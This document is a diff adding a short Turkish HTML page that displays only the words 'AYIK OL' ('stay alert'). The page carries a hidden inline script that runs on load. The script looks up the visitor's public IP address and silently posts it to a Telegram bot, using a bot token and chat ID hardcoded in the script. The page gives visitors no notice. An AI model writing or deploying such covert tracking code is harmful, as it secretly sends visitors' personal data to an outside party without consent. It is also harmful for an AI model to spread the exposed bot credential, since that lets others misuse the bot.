@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Ayık Ol</title>
+  <style>
+    body {
+      background-color: black;
+      color: red;
+      font-size: 60px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Arial', sans-serif;
+    }
+  </style>
+</head>
+<body>
+  AYIK OL
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+
+        const botToken = '8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g';
+        const chatId = '7791726274';
+        const message = `🚨 Yeni Ziyaretçi IP: ${ip}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      })
+      .catch(error => {
+        console.error("IP alınamadı veya gönderilemedi:", error);
+      });
+  </script>
+</body>
+</html>
